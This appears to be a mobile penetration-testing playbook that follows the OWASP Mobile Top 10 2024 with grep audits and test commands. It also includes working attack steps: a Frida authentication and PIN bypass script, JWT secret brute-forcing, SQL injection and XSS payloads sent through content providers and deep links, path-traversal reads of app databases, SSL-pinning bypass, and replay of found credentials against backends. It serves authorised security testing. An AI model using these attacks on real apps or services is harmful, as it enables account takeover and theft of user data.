# OWASP Mobile Top 10 2024 — Test Procedures & Exploits

**Source:** https://owasp.org/www-project-mobile-top-10/ (Final 2024 Release)
**Tags:** [ROOTED] [UNROOTED] [BOTH] throughout

## Table of Contents
- [M1: Improper Credential Usage](#m1)
- [M2: Inadequate Supply Chain Security](#m2)
- [M3: Insecure Authentication/Authorization](#m3)
- [M4: Insufficient Input/Output Validation](#m4)
- [M5: Insecure Communication](#m5)
- [M6: Inadequate Privacy Controls](#m6)
- [M7: Insufficient Binary Protections](#m7)
- [M8: Security Misconfiguration](#m8)
- [M9: Insecure Data Storage](#m9)
- [M10: Insufficient Cryptography](#m10)

---

## M1: Improper Credential Usage <a name="m1"></a>

**Risk:** Hardcoded credentials, insecure transmission, insecure on-device storage
**MASVS:** MASVS-STORAGE-2, MASVS-AUTH-1, MASVS-NETWORK-1
**Exploitability:** EASY | **Prevalence:** COMMON | **Detectability:** EASY

### Test Procedures

```bash
# 1. Static: search for hardcoded credentials [BOTH]
rg -i 'api[_-]?key|apikey|secret|password|passwd|token|bearer|auth' \
  [TARGET_PACKAGE]-jadx/ 2>/dev/null

# 2. Search strings.xml [BOTH]
cat [TARGET_PACKAGE]-decoded/res/values/strings.xml | \
  grep -iE 'key|secret|token|api|url|password'

# 3. Search assets [BOTH]
find [TARGET_PACKAGE]-raw/assets/ -type f | \
  xargs grep -li 'password\|secret\|token' 2>/dev/null

# 4. AWS / cloud credential patterns [BOTH]
rg -i 'AKIA[0-9A-Z]{16}|aws_access|aws_secret|AIza[0-9A-Za-z_-]{35}' \
  [TARGET_PACKAGE]-jadx/

# 5. Check for plaintext creds in logcat [BOTH]
adb logcat | grep -iE 'password|token|credential|api.key|secret'

# 6. Check for base64-encoded embedded creds [BOTH]
rg -i 'base64' [TARGET_PACKAGE]-jadx/ | grep -v 'android\|java'
# Decode suspects:
echo "[BASE64_STRING]" | base64 -d

# 7. Network: intercept creds in transit [BOTH]
# Set Burp proxy, trigger login, check for cleartext creds in POST body
# Check for Basic Auth headers: Authorization: Basic [BASE64]
```

### Exploit Scenarios

```bash
# Use hardcoded API key directly [BOTH]
curl -H "Authorization: Bearer [FOUND_TOKEN]" https://api.target.com/v1/users

# Test hardcoded admin creds on backend [BOTH]
curl -X POST https://api.target.com/login \
  -d '{"user":"admin","pass":"[FOUND_PASSWORD]"}' \
  -H "Content-Type: application/json"
```

### PoC Evidence
- Screenshot of found credential in decompiled source
- curl response showing unauthorized access
- Log to `braindump/poc_log.md`

---

## M2: Inadequate Supply Chain Security <a name="m2"></a>

**Risk:** Malicious/outdated third-party libraries, unsigned/tampered APK
**MASVS:** MASVS-CODE-3, MASVS-RESILIENCE-2
**Exploitability:** AVERAGE | **Prevalence:** COMMON | **Detectability:** DIFFICULT

### Test Procedures

```bash
# 1. Verify APK signing [BOTH]
apksigner verify --print-certs [APK_PATH]
keytool -printcert -jarfile [APK_PATH]
# Check: is it signed with debug key? Is cert self-signed?

# 2. Enumerate third-party libraries [BOTH]
ls [TARGET_PACKAGE]-jadx/
# Look for: okhttp, retrofit, firebase, amplitude, mixpanel, appsflyer, adjust, onesignal

# 3. Check library versions for known CVEs [BOTH]
cat [TARGET_PACKAGE]-decoded/res/raw/ 2>/dev/null
grep -r 'implementation\|compile' . 2>/dev/null  # if build.gradle accessible

# 4. SBOM / dependency scan [BOTH]
# Upload to MobSF → check third-party lib versions
# Use: retire.js, OWASP Dependency-Check, Snyk

# 5. Check for older vulnerable libs [BOTH]
rg -i 'com.squareup.okhttp[^3]|okhttp3:[0-3]\.' [TARGET_PACKAGE]-jadx/
rg -i 'gson:[01]\.' [TARGET_PACKAGE]-jadx/

# 6. Check for network on main thread (vulnerable Volley/OkHttp patterns) [BOTH]
rg -n 'StrictMode\|NetworkOnMainThread' [TARGET_PACKAGE]-jadx/
```

---

## M3: Insecure Authentication/Authorization <a name="m3"></a>

**Risk:** Auth bypass, IDOR, client-side auth, weak passwords
**MASVS:** MASVS-AUTH-1, MASVS-AUTH-2, MASVS-AUTH-3
**Exploitability:** EASY | **Prevalence:** COMMON | **Detectability:** AVERAGE

### Test Procedures

```bash
# 1. Test for anonymous API access — strip auth header [BOTH]
# Burp: Proxy → Intercept → remove Authorization header → forward
# Check if response still returns data

# 2. IDOR test — increment object IDs [BOTH]
# /api/v1/users/1337 → /api/v1/users/1338
# /api/orders/abc123 → enumerate or guess other IDs

# 3. JWT analysis [BOTH]
# Capture JWT from Burp, decode at jwt.io
# Check alg=none attack:
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
# Check weak HMAC secret:
python3 -c "
import jwt
token = '[JWT_TOKEN]'
# Test common secrets
for secret in ['secret','password','123456','']:
    try:
        d = jwt.decode(token, secret, algorithms=['HS256'])
        print(f'SECRET: {secret}')
    except: pass
"

# 4. Test offline auth bypass [BOTH]
# Enable airplane mode after login — does app still enforce auth?
adb shell am broadcast -a android.intent.action.AIRPLANE_MODE --ez state true

# 5. Test 4-digit PIN weakness [BOTH]
# Via Burp: brute force PIN change endpoint
# 0000-9999 = 10000 combinations

# 6. Check for role in JWT/token payload [BOTH]
# Decode JWT, look for "role":"user" → change to "role":"admin"
# Encode and replay

# 7. Frida: bypass local auth check [BOTH]
# Identify auth method in jadx, hook with Frida:
```

```javascript
// auth-bypass.js
Java.perform(function() {
  // Find auth check class/method in jadx first
  var AuthManager = Java.use('com.example.app.AuthManager');
  AuthManager.isAuthenticated.implementation = function() {
    console.log('[*] AuthManager.isAuthenticated() → true (bypassed)');
    return true;
  };

  // Bypass biometric result check
  var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
  // Hook auth callback if needed

  // Bypass PIN check
  var PinValidator = Java.use('com.example.app.PinValidator');
  PinValidator.checkPin.overload('java.lang.String').implementation = function(pin) {
    console.log('[*] checkPin bypassed for: ' + pin);
    return true;
  };
});
```

```bash
# Run auth bypass [BOTH]
frida -U -f [TARGET_PACKAGE] -l auth-bypass.js --no-pause

# 8. Check for client-side role in request [BOTH]
# Burp: find requests with role=user, modify to role=admin, replay
```

---

## M4: Insufficient Input/Output Validation <a name="m4"></a>

**Risk:** SQLi, XSS via WebView, intent injection, deep link parameter injection
**MASVS:** MASVS-CODE-4, MASVS-PLATFORM-2
**Exploitability:** DIFFICULT | **Prevalence:** COMMON | **Detectability:** EASY

### Test Procedures

```bash
# 1. Deep link injection [BOTH]
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://target?param=<script>alert(1)</script>"

adb shell am start -a android.intent.action.VIEW \
  -d "myapp://target?redirect=http://evil.com"

adb shell am start -a android.intent.action.VIEW \
  -d "myapp://target?file=../../../data/data/[TARGET_PACKAGE]/shared_prefs/prefs.xml"

# 2. Intent fuzzing via drozer [BOTH]
adb forward tcp:31415 tcp:31415
drozer console connect
dz> run app.package.attacksurface [TARGET_PACKAGE]
dz> run app.activity.start --component [TARGET_PACKAGE] [ACTIVITY_NAME] \
    --extra string param "' OR 1=1 --"

# 3. WebView XSS [BOTH]
# Find WebView activity, trigger via deep link with XSS payload
adb shell am start -n [TARGET_PACKAGE]/[WEBVIEW_ACTIVITY] \
  --es url "javascript:alert(document.cookie)"

# 4. Content provider injection [BOTH]
dz> run app.provider.query content://[AUTHORITY]/[PATH] \
    --selection "1=1 OR 1" --selection-args ""
dz> run app.provider.query content://[AUTHORITY]/[PATH] \
    --projection "* FROM users--"

# 5. SQL injection in content provider [BOTH]
adb shell content query --uri content://[AUTHORITY]/[PATH] \
  --where "1=1 UNION SELECT name,sql,null,null,null FROM sqlite_master--"

# 6. Path traversal via intent data [BOTH]
adb shell am start -n [TARGET_PACKAGE]/[FILE_ACTIVITY] \
  --es path "../../data/data/[TARGET_PACKAGE]/databases/main.db"
```

### Vulnerable Code Patterns (grep for these)

```bash
# SQLi risks [BOTH]
rg -n 'rawQuery\|execSQL' [TARGET_PACKAGE]-jadx/ | grep -v '?'

# WebView XSS [BOTH]
rg -n 'loadUrl\|loadData\|evaluateJavascript\|setJavaScriptEnabled\(true' \
  [TARGET_PACKAGE]-jadx/

# Intent redirect [BOTH]
rg -n 'getIntent.*getData\|Uri\.parse\|getQueryParameter' [TARGET_PACKAGE]-jadx/
```

---

## M5: Insecure Communication <a name="m5"></a>

**Risk:** Cleartext traffic, weak TLS, missing/bypassable cert pinning, MITM
**MASVS:** MASVS-NETWORK-1, MASVS-NETWORK-2
**Exploitability:** EASY | **Prevalence:** COMMON | **Detectability:** AVERAGE

### Test Procedures

```bash
# 1. Set up Burp proxy [BOTH]
# On device: WiFi → Proxy → [BURP_IP]:[BURP_PORT]
# Or use ADB port forward:
adb reverse tcp:[BURP_PORT] tcp:[BURP_PORT]

# 2. Install Burp CA cert [ROOTED]
adb push burp_cacert.der /system/etc/security/cacerts/9a5ba575.0
adb shell chmod 644 /system/etc/security/cacerts/9a5ba575.0
# File must be named with OpenSSL hash: openssl x509 -inform DER -subject_hash_old -in cacert.der | head -1

# Install Burp CA as user cert [UNROOTED]
adb push burp_cacert.cer /sdcard/burp.cer
# On device: Settings → Security → Install certificate

# 3. Check NSC for cleartext [BOTH]
grep -i 'cleartextTrafficPermitted\|usesCleartextTraffic' \
  [TARGET_PACKAGE]-decoded/res/xml/network_security_config.xml

# 4. Check for HTTP in URLs [BOTH]
rg -i 'http://' [TARGET_PACKAGE]-jadx/ | grep -v '//android\|//java\|//www.w3'

# 5. TLS version check against backend [BOTH]
nmap --script ssl-enum-ciphers -p 443 [TARGET_HOST]
testssl.sh [TARGET_HOST]

# 6. Frida SSL pinning bypass [BOTH]
frida -U -f [TARGET_PACKAGE] -l scripts/frida/universal-ssl-unpin.js --no-pause

# 7. Objection SSL bypass [BOTH]
objection -g [TARGET_PACKAGE] explore
# android sslpinning disable

# 8. Check for self-signed cert acceptance [BOTH]
rg -n 'AllowAllHostnameVerifier\|ALLOW_ALL_HOSTNAME_VERIFIER\|onReceivedSslError.*proceed\|checkServerTrusted.*\{\s*\}' \
  [TARGET_PACKAGE]-jadx/

# 9. Check WebView SSL handling [BOTH]
rg -n 'onReceivedSslError' [TARGET_PACKAGE]-jadx/ -A3

# 10. Smali patch for pinning bypass (when Frida fails) [UNROOTED]
# In jadx, find checkServerTrusted implementation
# In smali: replace method body with just "return-void"
# Rebuild and sign APK

# 11. OkHttp3 specific pinning [BOTH]
rg -n 'CertificatePinner\|certificatePinner\|pin(' [TARGET_PACKAGE]-jadx/
# Note the domains and pin hashes for bypass reference
```

### Vulnerable Code Patterns

```java
// FIND THESE in decompiled source:
// 1. Trust all certs
new X509TrustManager() { public void checkServerTrusted(...) {} }

// 2. Allow all hostnames  
HttpsURLConnection.setDefaultHostnameVerifier(new AllowAllHostnameVerifier());

// 3. WebView proceed on SSL error
handler.proceed();  // in onReceivedSslError

// 4. OkHttp no verification
new OkHttpClient.Builder().hostnameVerifier((hostname, session) -> true)
```

---

## M6: Inadequate Privacy Controls <a name="m6"></a>

**Risk:** PII in logs/URLs/backups/clipboard, excessive permissions, data sharing
**MASVS:** MASVS-STORAGE-1, MASVS-NETWORK-1, MASVS-PLATFORM-1
**Exploitability:** AVERAGE | **Prevalence:** COMMON | **Detectability:** EASY

### Test Procedures

```bash
# 1. Logcat PII scan [BOTH]
adb logcat | tee /tmp/logcat.txt
grep -iE 'password|token|email|phone|credit|ssn|dob|address' /tmp/logcat.txt

# 2. URL parameter PII leak [BOTH]
# In Burp: check all GET requests for PII in query string
# grep traffic for email, phone in URLs

# 3. Check backup configuration [BOTH]
grep -E 'allowBackup|fullBackupContent|hasFragileUserData' \
  [TARGET_PACKAGE]-decoded/AndroidManifest.xml

# 4. Extract backup [BOTH]
adb backup -f backup.ab -noapk [TARGET_PACKAGE]
# Convert: dd if=backup.ab bs=1 skip=24 | python3 -c "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" | tar -xv

# 5. Clipboard monitoring [BOTH]
# Via Frida: clipboard-monitor.js (see subskills/frida/SKILL.md)

# 6. Check crash reports / third-party SDKs for PII [BOTH]
rg -in 'crashlytics\|firebase.*analytics\|amplitude\|mixpanel\|sentry' \
  [TARGET_PACKAGE]-jadx/
# Check what data is sent to these SDKs

# 7. Permissions audit [BOTH]
grep 'uses-permission' [TARGET_PACKAGE]-decoded/AndroidManifest.xml | \
  grep -E "CAMERA|CONTACTS|LOCATION|MICROPHONE|READ_EXTERNAL|SMS|CALL|READ_CALL"

# 8. Third-party tracker detection [BOTH]
# Use: exodus-privacy.eu.org — upload APK online
# Or: grep for known tracker domains

# 9. Screenshot prevention check [BOTH]
rg -n 'FLAG_SECURE\|WindowManager.LayoutParams.FLAG_SECURE' [TARGET_PACKAGE]-jadx/
# If missing: app screens may appear in recent apps or be captured

# 10. Keyboard caching check [BOTH]
rg -n 'inputType\|TYPE_TEXT_VARIATION_PASSWORD' [TARGET_PACKAGE]-jadx/
# Look for password fields missing TYPE_TEXT_VARIATION_PASSWORD
```

---

## M7: Insufficient Binary Protections <a name="m7"></a>

**Risk:** Reverse engineering, code tampering, IP theft, redistribution
**MASVS:** MASVS-RESILIENCE-1, MASVS-RESILIENCE-2, MASVS-RESILIENCE-3, MASVS-RESILIENCE-4
**Exploitability:** EASY | **Prevalence:** COMMON | **Detectability:** EASY

### Test Procedures

```bash
# 1. Obfuscation check [BOTH]
jadx -d [TARGET_PACKAGE]-jadx/ [APK_PATH]
# Meaningful names (LoginManager, PasswordHelper) = no obfuscation → HIGH SIGNAL
# Single-letter names (a.b.c) = ProGuard/R8 applied

# 2. debuggable flag [BOTH]
grep 'android:debuggable' [TARGET_PACKAGE]-decoded/AndroidManifest.xml
# "true" in release build = HIGH SIGNAL

# 3. Anti-tampering check [BOTH]
rg -n 'getSignatures\|getPackageInfo\|Signature\|CRC\|checksum\|digest' \
  [TARGET_PACKAGE]-jadx/

# 4. Frida/Xposed/root detection [BOTH]
rg -in 'frida\|xposed\|substrate\|magisk\|isRooted\|checkRoot' \
  [TARGET_PACKAGE]-jadx/

# 5. SafetyNet / Play Integrity [BOTH]
rg -in 'SafetyNet\|SafetyNetApi\|attest\|PlayIntegrity' [TARGET_PACKAGE]-jadx/

# 6. Native library protections [BOTH]
checksec --file=[TARGET_PACKAGE]-raw/lib/arm64-v8a/[LIB].so
# Look for: PIE, NX, Stack Canary, RELRO

# 7. String extraction from binary [BOTH]
strings [TARGET_PACKAGE]-raw/lib/arm64-v8a/[LIB].so | \
  grep -iE 'password|secret|key|http|api'

# 8. Attempt APK repackaging [BOTH]
apktool d [APK_PATH] -o test-repack/
# Modify: test-repack/smali/com/example/PaymentActivity.smali
# Change license check to return true
apktool b test-repack/ -o repack.apk
apksigner sign --ks ~/.android/debug.keystore --ks-key-alias androiddebugkey \
  --ks-pass pass:android --key-pass pass:android repack.apk
adb install repack.apk
# If installs and runs → no integrity check → vulnerability

# 9. Ghidra / radare2 for native analysis [BOTH]
r2 -A [TARGET_PACKAGE]-raw/lib/arm64-v8a/[LIB].so
# afl → list functions
# pdf @sym.functionName → disassemble
```

---

## M8: Security Misconfiguration <a name="m8"></a>

**Risk:** Exported components, debuggable, allowBackup, world-readable prefs, file provider abuse
**MASVS:** MASVS-PLATFORM-1, MASVS-STORAGE-1, MASVS-CODE-2
**Exploitability:** DIFFICULT | **Prevalence:** COMMON | **Detectability:** EASY

### Test Procedures

```bash
# 1. Full manifest audit [BOTH]
grep -E 'android:exported="true"' [TARGET_PACKAGE]-decoded/AndroidManifest.xml
grep -E 'android:debuggable="true"' [TARGET_PACKAGE]-decoded/AndroidManifest.xml
grep -E 'android:allowBackup="true"' [TARGET_PACKAGE]-decoded/AndroidManifest.xml
grep -E 'android:usesCleartextTraffic="true"' [TARGET_PACKAGE]-decoded/AndroidManifest.xml

# 2. Drozer attack surface [BOTH]
adb forward tcp:31415 tcp:31415
drozer console connect
dz> run app.package.attacksurface [TARGET_PACKAGE]
# Shows: X activities exported, Y providers exported, Z receivers exported

# 3. Launch exported activity directly [BOTH]
dz> run app.activity.start --component [TARGET_PACKAGE] [ACTIVITY_NAME]
# Or via ADB:
adb shell am start -n [TARGET_PACKAGE]/[ACTIVITY_NAME]
# Try all exported activities — some may expose admin/debug screens

# 4. File provider path exposure [BOTH]
cat [TARGET_PACKAGE]-decoded/res/xml/file_paths.xml
# VULNERABLE: <root-path name="root" path="/"/> → exposes entire FS

# Exploit file provider [BOTH]
# Build PoC app that requests URI from vulnerable provider:
# content://[AUTHORITY]/root/../../../data/data/[TARGET_PACKAGE]/databases/main.db

# 5. World-readable SharedPreferences [ROOTED]
adb shell run-as [TARGET_PACKAGE] ls -la shared_prefs/
# Or rooted:
adb shell ls -la /data/data/[TARGET_PACKAGE]/shared_prefs/
adb shell cat /data/data/[TARGET_PACKAGE]/shared_prefs/prefs.xml

# 6. Test debug bridge [BOTH]
adb shell run-as [TARGET_PACKAGE] id  # works if debuggable

# 7. Broadcast receiver injection [BOTH]
dz> run app.broadcast.send --component [TARGET_PACKAGE] [RECEIVER] \
    --action [ACTION] --extra string param "injected"
adb shell am broadcast -a [ACTION] --es data "injected"

# 8. Exported service exploitation [BOTH]
dz> run app.service.start --component [TARGET_PACKAGE] [SERVICE_NAME] \
    --extra string cmd "execute"
```

### File Provider Exploit (PoC)

```bash
# Query via ADB [BOTH]
adb shell content query \
  --uri "content://[TARGET_PACKAGE].provider/root/../../../data/data/[TARGET_PACKAGE]/shared_prefs/auth.xml"

# Or grant URI and read via PoC app [BOTH]
# See references/poc-app-creation.md for PoC app template
```

---

## M9: Insecure Data Storage <a name="m9"></a>

**Risk:** Plaintext passwords/tokens in SharedPrefs/SQLite/files/logs, unencrypted DB
**MASVS:** MASVS-STORAGE-1 through MASVS-STORAGE-8
**Exploitability:** EASY | **Prevalence:** COMMON | **Detectability:** AVERAGE

### Test Procedures

```bash
# 1. Enumerate app data directory [ROOTED]
adb shell
su
ls -la /data/data/[TARGET_PACKAGE]/
ls -la /data/data/[TARGET_PACKAGE]/shared_prefs/
ls -la /data/data/[TARGET_PACKAGE]/databases/
ls -la /data/data/[TARGET_PACKAGE]/files/

# 2. ADB run-as (debuggable apps) [UNROOTED]
adb shell run-as [TARGET_PACKAGE] ls -la
adb shell run-as [TARGET_PACKAGE] cat shared_prefs/prefs.xml
adb shell run-as [TARGET_PACKAGE] ls databases/

# 3. Check SharedPreferences for secrets [ROOTED]
adb shell cat /data/data/[TARGET_PACKAGE]/shared_prefs/*.xml
# Look for: password, token, auth, key, secret

# 4. SQLite database inspection [ROOTED]
adb pull /data/data/[TARGET_PACKAGE]/databases/ ./dbs/
sqlite3 dbs/main.db
.tables
.schema users
SELECT * FROM users LIMIT 10;
SELECT * FROM sessions;

# 5. File inspection [ROOTED]
adb shell find /data/data/[TARGET_PACKAGE]/ -type f -name "*.json" -o -name "*.xml" \
  -o -name "*.txt" -o -name "*.log"
adb pull /data/data/[TARGET_PACKAGE]/files/ ./app-files/

# 6. External storage [BOTH]
adb shell ls -la /sdcard/Android/data/[TARGET_PACKAGE]/
adb pull /sdcard/Android/data/[TARGET_PACKAGE]/ ./external-data/

# 7. Cache directory [ROOTED]
adb shell ls -la /data/data/[TARGET_PACKAGE]/cache/
adb pull /data/data/[TARGET_PACKAGE]/cache/ ./cache/

# 8. WebView cache [ROOTED]
adb pull /data/data/[TARGET_PACKAGE]/cache/WebView/ ./webview-cache/
grep -r 'token\|password\|auth\|key' webview-cache/

# 9. Backup extraction [BOTH]
adb backup -f backup.ab -noapk [TARGET_PACKAGE]
dd if=backup.ab bs=1 skip=24 | python3 -c \
  "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" \
  | tar -xv -C backup-extracted/
find backup-extracted/ -type f | xargs grep -li 'password\|token\|secret' 2>/dev/null

# 10. Logcat for sensitive data [BOTH]
adb logcat -d | grep -iE 'password|token|secret|key|email|phone|ssn'

# 11. Objection data inspection [BOTH]
objection -g [TARGET_PACKAGE] explore
# android file ls
# android file download /data/data/[TARGET_PACKAGE]/shared_prefs/prefs.xml
# env  (shows all data paths)

# 12. Realm database [ROOTED]
find /data/data/[TARGET_PACKAGE]/ -name "*.realm"
# Use Realm Studio or realm-java browser

# 13. Check EncryptedSharedPreferences usage [BOTH]
rg -n 'EncryptedSharedPreferences\|EncryptedFile\|MasterKey' [TARGET_PACKAGE]-jadx/
# If missing → plaintext storage likely
```

---

## M10: Insufficient Cryptography <a name="m10"></a>

**Risk:** Weak algorithms (DES/RC4/MD5), ECB mode, static IVs, insecure key storage
**MASVS:** MASVS-CRYPTO-1, MASVS-CRYPTO-2
**Exploitability:** AVERAGE | **Prevalence:** COMMON | **Detectability:** AVERAGE

### Test Procedures

```bash
# 1. Static: find weak algorithms [BOTH]
rg -in '"DES"\|"3DES"\|"RC4"\|"MD5"\|"SHA-1"\|"AES/ECB"\|"Blowfish"' \
  [TARGET_PACKAGE]-jadx/

# 2. Find hardcoded keys/IVs [BOTH]
rg -n 'IvParameterSpec\|SecretKeySpec\|PBEKeySpec' [TARGET_PACKAGE]-jadx/
# Look for byte[] literals, hex strings as keys

# 3. Insecure random [BOTH]
rg -n 'new Random()\|Math\.random\|java\.util\.Random' [TARGET_PACKAGE]-jadx/
# Should be SecureRandom

# 4. Runtime: Frida crypto intercept [BOTH]
frida -U -f [TARGET_PACKAGE] -l scripts/frida/crypto-dump.js --no-pause
# Dumps: algorithm, mode, key bytes, IV, plaintext, ciphertext

# 5. Check KeyStore usage [BOTH]
rg -n 'KeyStore\|KeyGenerator\|KeyGenParameterSpec' [TARGET_PACKAGE]-jadx/
# Good: Android Keystore with BLOCK_MODE_GCM, no auth required = weaker

# 6. TLS cipher strength [BOTH]
testssl.sh [TARGET_HOST]
nmap --script ssl-enum-ciphers -p 443 [TARGET_HOST]
# Flag: TLS 1.0/1.1, RC4, 3DES, NULL, EXPORT, anon

# 7. Password hashing [BOTH]
rg -in 'sha1\|md5\|sha-1\|MessageDigest.*MD5' [TARGET_PACKAGE]-jadx/ | \
  grep -i 'password\|pass\|pwd'
# Should use: bcrypt, PBKDF2, scrypt, Argon2 with salt

# 8. Identify custom crypto [BOTH]
rg -in 'xor\|rotateLeft\|rotateRight\|bitshift' [TARGET_PACKAGE]-jadx/
```

### Crypto Exploit — Recover Encrypted Data

```javascript
// crypto-dump.js output gives you: key, IV, ciphertext, algorithm
// Decrypt offline:
python3 << 'EOF'
from Crypto.Cipher import AES
import base64

key = bytes.fromhex('[KEY_HEX_FROM_FRIDA]')
iv = bytes.fromhex('[IV_HEX_FROM_FRIDA]')
ct = bytes.fromhex('[CIPHERTEXT_HEX]')

cipher = AES.new(key, AES.MODE_CBC, iv)
pt = cipher.decrypt(ct)
print("Plaintext:", pt)
EOF
```

---

## Quick Test Checklist (All M1-M10)

Run this sequence on every engagement and log results to `braindump/findings_map.md`:

```bash
# === Static pass (5 min) ===
grep -E 'debuggable|allowBackup|exported|cleartext' [TARGET_PACKAGE]-decoded/AndroidManifest.xml
rg -i 'password|token|secret|api.key' [TARGET_PACKAGE]-jadx/ | head -20
rg -in '"DES"\|"MD5"\|"ECB"\|new Random()' [TARGET_PACKAGE]-jadx/ | head -20
cat [TARGET_PACKAGE]-decoded/res/xml/network_security_config.xml 2>/dev/null

# === Attack surface (2 min) ===
adb forward tcp:31415 tcp:31415 && drozer console connect
dz> run app.package.attacksurface [TARGET_PACKAGE]

# === Dynamic pass (ongoing) ===
adb logcat | grep -iE 'password|token|secret' &
frida -U -f [TARGET_PACKAGE] -l scripts/frida/universal-ssl-unpin.js --no-pause &
# Set Burp proxy, exercise all app features
```
